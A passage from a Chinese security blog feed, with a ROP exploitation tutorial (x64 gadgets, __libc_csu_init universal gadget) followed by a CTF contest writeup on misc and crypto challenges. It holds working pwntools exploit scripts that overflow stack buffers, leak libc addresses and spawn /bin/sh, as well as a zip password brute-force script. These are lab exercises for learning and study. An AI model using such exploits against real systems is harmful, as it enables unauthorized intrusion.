class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level-4-使用ROPgadget寻找gadgets"><a href="#level-4-使用ROPgadget寻找gadgets" class="headerlink" title="level 4 - 使用ROPgadget寻找gadgets"></a>level 4 - 使用ROPgadget寻找gadgets</h3><p>x86 的参数都是保存在栈上（即栈传参）。而 x64 的前六个参数依次保存在RDI、RSI、RDX、RCX、R8 和 R9 寄存器中，还有更多的参数才会保存到栈上。所以如果我们需要传递少量的参数就需要用到<code>gadget</code>。简单的 gadget ，我们可以通过命令 <code>objdump</code>查找，如果需要复杂的 gadget 时（或者说更加常用的），就需要借助诸如<code>ROPgadget、Ropper、ROPEME</code>等等查询工具。</p><p>使用命令<code>ROPgadget --binary level4 --only &quot;pop|ret&quot;</code>搜索一下 level 4 中所有 pop ret 的 gadget。就这个程序而言，太小了，找不到<code>pop rdi;ret</code>的 gadget。（不信你试试XD）</p><p>由于程序调用了<code>libc.so</code>，那我们就查查<code>libc.so</code>中有没有需要的 gadget 。首先，需要将使用的 libc 复制到工作目录。然后在使用 ROPgadget 查询。找到gadget之后，就可以构造ROP链。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 查询使用的libc.so所在</span></span><br><span class="line">ldd level4</span><br><span class="line"><span class="meta">#</span><span class="bash"> 复制 &amp; 重命名</span></span><br><span class="line">sudo cp /lib/x86_64-linux-gnu/libc.so.6 libc.so</span><br><span class="line">ROPgadget --binary libc.so --only &quot;pop|ret&quot;</span><br><span class="line">​```(省略)</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br><span class="line">​```(省略)</span><br></pre></td></tr></table></figure><p>先填充栈空间，到达 rip 上一个内存空间。覆写为gadget地址，再接着是<code>/bin/sh</code>内存地址，这样就可以将<code>/bin/sh</code>存入到 rdi 寄存器。然后运行指针再跳转到 rip+0x10 (即system_addr被我们写入的位置)，执行<code>system(&quot;/bin/sh&quot;)</code>。最终构成的ROP链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr)</span><br></pre></td></tr></table></figure><p>最终 exp 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!python</span></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">binsh_addr_offset = <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>)) -libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr_offset = &quot;</span> + <span class="built_in">hex</span>(binsh_addr_offset)</span><br><span class="line"></span><br><span class="line">pop_ret_offset = <span class="number">0x0000000000022a12</span> - libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pop_ret_offset = &quot;</span> + <span class="built_in">hex</span>(pop_ret_offset)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_offset = 0x00000000000f4739 - libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment">#print &quot;pop_pop_call_offset = &quot; + hex(pop_pop_call_offset)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n##########receiving system addr##########\n&quot;</span></span><br><span class="line">system_addr_str = p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">system_addr = <span class="built_in">int</span>(system_addr_str,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;system_addr = &quot;</span> + <span class="built_in">hex</span>(system_addr)</span><br><span class="line"></span><br><span class="line">binsh_addr = system_addr + binsh_addr_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;binsh_addr = &quot;</span> + <span class="built_in">hex</span>(binsh_addr)</span><br><span class="line"></span><br><span class="line">pop_ret_addr = system_addr + pop_ret_offset</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;pop_ret_addr = &quot;</span> + <span class="built_in">hex</span>(pop_ret_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#pop_pop_call_addr = system_addr + pop_pop_call_offset</span></span><br><span class="line"><span class="comment">#print &quot;pop_pop_call_addr = &quot; + hex(pop_pop_call_addr)</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span> + p64(pop_ret_addr) + p64(binsh_addr) + p64(system_addr) </span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = &quot;\x00&quot;*136 + p64(pop_pop_call_addr) + p64(system_addr) + p64(binsh_addr) </span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n##########sending payload##########\n&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="level-5-通用gadget"><a href="#level-5-通用gadget" class="headerlink" title="level 5 - 通用gadget"></a>level 5 - 通用gadget</h3><p>因为程序在编译过程中会加入一些通用函数用来进行初始化操作（比如加载libc.so的初始化函数），所以虽然很多程序的源码不同，但是初始化的过程是相同的，因此针对这些初始化函数，我们可以提取一些通用的gadgets加以使用，从而达到我们想要达到的效果。</p><p><strong>level 5 仅仅只有一个栈溢出漏洞点</strong>，也没有任何的辅助函数可以使用，所以我们要先想办法泄露内存信息，找到 system() 的地址，然后再传递 /bin/sh 到 .bss 段。</p><blockquote><p>为什么传递 /bin/sh 到 .bss段</p></blockquote><p>最后调用 system(“/bin/sh”) 。因为原程序使用了 write() 和 read() 函数，我们可以通过 write() 去输出 write.got 的地址，从而计算出 libc.so 在内存中的地址。但问题在于 write() 的参数应该如何传递。我们使用 ROPgadget 并没有找到类似于 pop rdi, ret,pop rsi, ret 这样的 gadgets 。那应该怎么办呢？其实在 x64 下有一些万能的 gadgets 可以利用。</p><blockquote><p>蒸米师傅提供编译好的文件和下面有点区别，下面是用相同源码在ubuntu 16.04 下编译，编译指令：gcc -fno-stack-protector -o level5 level5.c</p></blockquote><p>使用命令<code>objdump -d level5</code>找到调用libc.so的初始化函数<code>__libc_csu_init()</code>。汇编代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:41 57                push   %r15</span><br><span class="line">  4005c2:41 56                push   %r14</span><br><span class="line">  4005c4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4005c7:41 55                push   %r13</span><br><span class="line">  4005c9:41 54                push   %r12</span><br><span class="line">  4005cb:4c 8d 25 3e 08 20 00 lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005d2:55                   push   %rbp</span><br><span class="line">  4005d3:48 8d 2d 3e 08 20 00 lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005da:53                   push   %rbx</span><br><span class="line">  4005db:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  4005de:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  4005e1:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  4005e4:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  4005e8:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  4005ec:e8 0f fe ff ff       callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  4005f4:74 20                je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:31 db                xor    %ebx,%ebx</span><br><span class="line">  4005f8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:00 </span><br><span class="line">  400600:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400603:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400606:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400609:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400611:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400614:75 ea                jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40061a:5b                   pop    %rbx</span><br><span class="line">  40061b:5d                   pop    %rbp</span><br><span class="line">  40061c:41 5c                pop    %r12</span><br><span class="line">  40061e:41 5d                pop    %r13</span><br><span class="line">  400620:41 5e                pop    %r14</span><br><span class="line">  400622:41 5f                pop    %r15</span><br><span class="line">  400624:c3                   retq   </span><br><span class="line">  400625:90                   nop</span><br><span class="line">  400626:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:00 00 00 </span><br></pre></td></tr></table></figure><p>利用其中 0x40061a 开始的6行代码，我们可以控制寄存器<code>rbx,rbp,r12,r13,r14,r15</code>的值。随后可以利用 0x400600 开始的6行代码，将 r15 的值赋值给 rdx ， r14 的值赋值给 rsi ， r13 的值赋值给 edi 。随后就会调用call qword ptr [r12+rbx*8]。只要我们控制rbx的值为 0 ，精心构造栈上传入上述寄存器的值，就可以实现控制 pc ，调用我们想要的函数。</p><blockquote><p>为什么需要控制 rbx 的值为0？</p><p>执行完 call qword ptr [r12+rbx*8] 之后，程序会对rbx+=1，然后对比 rbp 和 rbx 的值，如果相等就会继续向下执行并 ret 到我们想要继续执行的地址。所以为了让 rbp 和 rbx 的值相等，我们可以将 rbp 的值设置为1，因为之前已经将 rbx 的值设置为0了。</p></blockquote><p>我们先构造 payload1 ，利用 write() 输出 write 在内存中的地址。注意我们的 gadget 是 call qword ptr [r12+rbx*8] ，所以我们应该使用 write.got 的地址而不是 write.plt 的地址。并且为了返回到原程序中，重复利用buffer overflow的漏洞，我们需要继续覆盖栈上的数据，直到把返回值覆盖成目标函数的main函数为止。</p><blockquote><p>为什么使用的是 write.got 而不是 write.plt？</p><p>write.plt 相当于 call write。执行了两个动作，将指针跳转到 write 真实地址；将返回地址压栈。</p><p>write.got 仅将指针跳转到 write 真实地址。</p></blockquote><p>payload1 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload1 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">1</span>) + p64(got_write) + p64(<span class="number">8</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload1 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload1 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload1 += p64(main)</span><br></pre></td></tr></table></figure><p>当我们 exp 在收到 write() 在内存中的地址后，就可以计算出 system() 在内存中的地址了。接着我们构造 payload2 ，利用 read() 将 system() 的地址以及 /bin/sh 读入到 .bss 段内存中。</p><p>payload2 构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload2 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) + p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(got_read) + p64(<span class="number">0</span>) + p64(bss_addr) + p64(<span class="number">16</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload2 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload2 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload2 += p64(main)</span><br></pre></td></tr></table></figure><p>最后我们构造 payload3 ,调用 system() 函数执行 /bin/sh 。注意， system() 的地址保存在了 .bss 段首地址上， /bin/sh 的地址保存在了 .bss 段首地址+8字节上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#rdi=  edi = r13,  rsi = r14, rdx = r15 </span></span><br><span class="line"><span class="comment">#system(rdi = bss_addr+8 = &quot;/bin/sh&quot;)</span></span><br><span class="line">payload3 =  <span class="string">&quot;\x00&quot;</span>*<span class="number">136</span></span><br><span class="line">payload3 += p64(<span class="number">0x400606</span>) + p64(<span class="number">0xdeadbeef</span>) +p64(<span class="number">0</span>) + p64(<span class="number">1</span>) + p64(bss_addr) + p64(bss_addr+<span class="number">8</span>) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>) <span class="comment"># pop_junk_rbx_rbp_r12_r13_r14_r15_ret</span></span><br><span class="line">payload3 += p64(<span class="number">0x4005F0</span>) <span class="comment"># mov rdx, r15; mov rsi, r14; mov edi, r13d; call qword ptr [r12+rbx*8]</span></span><br><span class="line">payload3 += <span class="string">&quot;\x00&quot;</span>*<span class="number">56</span></span><br><span class="line">payload3 += p64(main)</span><br></pre></td></tr></table></figure><blockquote><p>以上是蒸米文章阅读后的理解笔记</p></blockquote><p>最终exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./level5&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.17.155&#x27;,10001)</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;level5&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">main = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x40061a</span></span><br><span class="line">gadget2 = <span class="number">0x400600</span></span><br><span class="line"></span><br><span class="line">got_write = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]write() got: &quot;</span> + <span class="built_in">hex</span>(got_write)</span><br><span class="line">got_read = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]read() got: &quot;</span> + <span class="built_in">hex</span>(got_read)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, ret</span>):</span></span><br><span class="line"><span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line"><span class="comment"># rbx should be 0,</span></span><br><span class="line"><span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line"><span class="comment"># r12 should be the function we want to call</span></span><br><span class="line"><span class="comment"># rdi=edi=r15d</span></span><br><span class="line"><span class="comment"># rsi=r14</span></span><br><span class="line"><span class="comment"># rdx=r13</span></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * <span class="number">136</span></span><br><span class="line">payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">payload += p64(gadget2)</span><br><span class="line">payload += <span class="string">&quot;B&quot;</span> * <span class="number">56</span></span><br><span class="line">payload += p64(ret)</span><br><span class="line"><span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="comment">#write(rdi=1, rsi=write.got, rdx=4)</span></span><br><span class="line">payload1 = csu(<span class="number">0</span>, <span class="number">1</span>, got_write, <span class="number">8</span>, got_write, <span class="number">1</span>, main)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload1#############\n&quot;</span></span><br><span class="line">p.send(payload1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]leak write() addr: &quot;</span> + <span class="built_in">hex</span>(write_addr)</span><br><span class="line"></span><br><span class="line">libc.address = write_addr - libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">execve_addr = libc.symbols[<span class="string">&quot;execve&quot;</span>]</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[*]execve() addr: &quot;</span> + <span class="built_in">hex</span>(execve_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#read(rdi=0, rsi=bss_addr, rdx=16)</span></span><br><span class="line">payload2 = csu(<span class="number">0</span>, <span class="number">1</span>, got_read, <span class="number">16</span>, bss_addr, <span class="number">0</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload2#############\n&quot;</span></span><br><span class="line">p.send(payload2)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.send(p64(execve_addr))</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(rdi = bss_addr+8 = &quot;/bin/sh&quot;, rsi=0, rdx=0)</span></span><br><span class="line">payload3 = csu(<span class="number">0</span>, <span class="number">1</span>, bss_addr, <span class="number">0</span>, <span class="number">0</span>, bss_addr + <span class="number">8</span>, main)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\n#############sending payload3#############\n&quot;</span></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.send(payload3)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> ROP </tag>
            
            <tag> 蒸米学rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届海啸杯部分题目Writeup</title>
      <link href="archives/a7cb8952/"/>
      <url>archives/a7cb8952/</url>
      
        <content type="html"><![CDATA[<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><p>题目提供的<code>1.zip</code>解压出<code>flag.txt</code>，txt文件里面有大量意义不明的字符，尝试性使用<code>base64</code>解密，得到结果如下图：</p><p><img src="https://i.loli.net/2019/10/20/U7kotCYViuZWn3d.png"></p><p>首行有<code>PNG</code>、<code>Adobe</code>等字样，推测是解密后的明文是PNG文件十六进制文件。用python解密后写入到后缀名为<code>png</code>的文件中，查看图片内容，脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./flag.txt</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(&amp;<span class="comment">#039;1.png&amp;#039;,&amp;#039;w&amp;#039;)</span></span><br><span class="line">encodestr = base64.b64decode(&amp;<span class="comment">#039;这里填入flag.txt中的密文&amp;#039;.encode(&amp;#039;utf-8&amp;#039;))</span></span><br><span class="line">file.write(encodestr)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><h4 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h4><p><img src="https://i.loli.net/2019/10/20/YIAsZlXdBTnqgy7.png"></p><h3 id="老烟枪"><a href="#老烟枪" class="headerlink" title="老烟枪"></a>老烟枪</h3><p>用binwalk分析图片，结果显示图片中有一个压缩包。使用命令<code>binwalk -e cxk.png</code>分离出压缩包，得到flag.png，用ps的水平翻转功能，得到正常flag</p><h4 id="flag-1"><a href="#flag-1" class="headerlink" title="flag"></a>flag</h4><p><img src="https://i.loli.net/2019/10/20/FmUsSLTkGZlq5EC.png"></p><h3 id="表白"><a href="#表白" class="headerlink" title="表白"></a>表白</h3><p>这题就是可以百度到的png隐写操作—-修改图片宽高。用winhex打开png文件，对应修改头文件中的高数值，得到flag。</p><p><img src="https://i.loli.net/2019/10/20/21IzEYGdH8qOarT.png"></p><h4 id="flag-2"><a href="#flag-2" class="headerlink" title="flag"></a>flag</h4><p><img src="https://i.loli.net/2019/10/20/weqvR7HLGPnfjpd.png"></p><h3 id="小明的求助"><a href="#小明的求助" class="headerlink" title="小明的求助"></a>小明的求助</h3><p>题目给出压缩包里面有一个需要密码才能解压的<code>flag.txt</code>文件，且题目提示<em>密码他只知道”hlqiou”加上4位数字</em>。尝试进行爆破。</p><p>生成密码字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">file = <span class="built_in">open</span>(&amp;quot;p.txt&amp;quot;,&amp;quot;w&amp;quot;)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">file.write(&amp;quot;hlqiou&amp;quot;+<span class="built_in">str</span>(i)+&amp;quot;\n&amp;quot;)</span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure><p>爆破密码脚本（python2）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="comment">#./p.txt</span></span><br><span class="line"><span class="comment">#./xiaoming.zip</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">zipbp</span>(<span class="params">zfile, pwd</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        zfile.extractall(pwd=pwd)</span><br><span class="line">        <span class="built_in">print</span> &amp;<span class="comment">#039;password found : %s&amp;#039; % pwd</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    zfile = zipfile.ZipFile(&amp;<span class="comment">#039;xiaoming.zip&amp;#039;)</span></span><br><span class="line">    pwdall = <span class="built_in">open</span>(&amp;<span class="comment">#039;p.txt&amp;#039;)</span></span><br><span class="line">    <span class="keyword">for</span> pwda <span class="keyword">in</span> pwdall.readlines():</span><br><span class="line">        pwd = pwda.strip(&amp;<span class="comment">#039;\n&amp;#039;)</span></span><br><span class="line">        t = threading.Thread(target=zipbp, args=(zfile, pwd))</span><br><span class="line">        t.start()</span><br><span class="line">        t.join()</span><br><span class="line"><span class="keyword">if</span> __name__ == &amp;<span class="comment">#039;__main__&amp;#039;:</span></span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p><code>password found : hlqiou6974</code></p><h4 id="flag-3"><a href="#flag-3" class="headerlink" title="flag"></a>flag</h4><p><code>flag&#123;5oiR54ix6buE6I6J6I2D&#125;</code></p><h2 id="密码学"><a href="#密码学" class="headerlink" title="密码学"></a>密码学</h2><h3 id="恺撒将军"><a href="#恺撒将军" class="headerlink" title="恺撒将军"></a>恺撒将军</h3><p>这题就是恺撒密码加密，特殊点就是有存在<code>]</code>、<code>&lt;</code>等标点字符，一般在线解密会略过，干脆就自己写脚本，反正就是基于ASCII码做偏移：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td 